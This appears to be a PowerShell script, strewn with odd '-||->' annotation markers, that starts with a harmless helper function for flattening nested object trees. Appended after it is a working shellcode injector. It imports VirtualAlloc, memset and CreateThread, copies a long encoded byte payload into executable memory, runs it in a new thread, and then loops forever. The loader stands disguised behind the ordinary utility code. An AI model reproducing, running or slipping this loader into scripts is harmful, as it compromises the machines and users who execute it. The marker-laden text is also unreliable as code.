

 -||-> function Get-TreeObjectArrayAsList{



    param(    
        $Array,        
        $Attribute,        
        $Level = 0
    )

    
     -||-> $Array = $Array.psobject.Copy() <-||- 

     -||-> $Array | %{
        
        
         -||-> $Childs =  -||-> iex "`$_.$Attribute" <-||-  <-||- 
    
        
         -||-> $_ | select *, @{L= -||-> "Level" <-||- ;E= -||-> { -||-> $Level <-||- } <-||- } <-||- 
    
        
         -||-> if( -||-> $Childs <-||- ){
        
            
             -||-> $Childs | %{ -||-> Get-TreeObjectArrayAsList -Array $_ -Attribute $Attribute -Level ( -||-> $Level + 1 <-||- ) <-||- } <-||- 
        } <-||- 
    } <-||- 
} <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0xfe,0x27,0xc1,0x8e,0xd9,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xc5,0x04,0x03,0x7d,0xf1,0xc5,0x34,0x72,0xe5,0x88,0xb7,0x8b,0xf5,0xec,0x3e,0x6e,0xc4,0x2c,0x24,0xfa,0x76,0x9d,0x2e,0xae,0x7a,0x56,0x62,0x5b,0x09,0x1a,0xab,0x6c,0xba,0x91,0x8d,0x43,0x3b,0x89,0xee,0xc2,0xbf,0xd0,0x22,0x25,0xfe,0x1a,0x37,0x24,0xc7,0x47,0xba,0x74,0x90,0x0c,0x69,0x69,0x95,0x59,0xb2,0x02,0xe5,0x4c,0xb2,0xf7,0xbd,0x6f,0x93,0xa9,0xb6,0x29,0x33,0x4b,0x1b,0x42,0x7a,0x53,0x78,0x6f,0x34,0xe8,0x4a,0x1b,0xc7,0x38,0x83,0xe4,0x64,0x05,0x2c,0x17,0x74,0x41,0x8a,0xc8,0x03,0xbb,0xe9,0x75,0x14,0x78,0x90,0xa1,0x91,0x9b,0x32,0x21,0x01,0x40,0xc3,0xe6,0xd4,0x03,0xcf,0x43,0x92,0x4c,0xd3,0x52,0x77,0xe7,0xef,0xdf,0x76,0x28,0x66,0x9b,0x5c,0xec,0x23,0x7f,0xfc,0xb5,0x89,0x2e,0x01,0xa5,0x72,0x8e,0xa7,0xad,0x9e,0xdb,0xd5,0xef,0xf6,0x28,0xd4,0x0f,0x06,0x27,0x6f,0x63,0x34,0xe8,0xdb,0xeb,0x74,0x61,0xc2,0xec,0x7b,0x58,0xb2,0x63,0x82,0x63,0xc3,0xaa,0x40,0x37,0x93,0xc4,0x61,0x38,0x78,0x15,0x8e,0xed,0x15,0x10,0x18,0xce,0x42,0x1b,0x99,0xa6,0x90,0x1c,0x08,0x6b,0x1c,0xfa,0x7a,0xc3,0x4e,0x53,0x3a,0xb3,0x2e,0x03,0xd2,0xd9,0xa0,0x7c,0xc2,0xe1,0x6a,0x15,0x68,0x0e,0xc3,0x4d,0x04,0xb7,0x4e,0x05,0xb5,0x38,0x45,0x63,0xf5,0xb3,0x6a,0x93,0xbb,0x33,0x06,0x87,0x2b,0xb4,0x5d,0xf5,0xfd,0xcb,0x4b,0x90,0x01,0x5e,0x70,0x33,0x56,0xf6,0x7a,0x62,0x90,0x59,0x84,0x41,0xab,0x50,0x10,0x2a,0xc3,0x9c,0xf4,0xaa,0x13,0xcb,0x9e,0xaa,0x7b,0xab,0xfa,0xf8,0x9e,0xb4,0xd6,0x6c,0x33,0x21,0xd9,0xc4,0xe0,0xe2,0xb1,0xea,0xdf,0xc5,0x1d,0x14,0x0a,0xd4,0x62,0xc3,0x72,0xa2,0x8a,0xd7 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



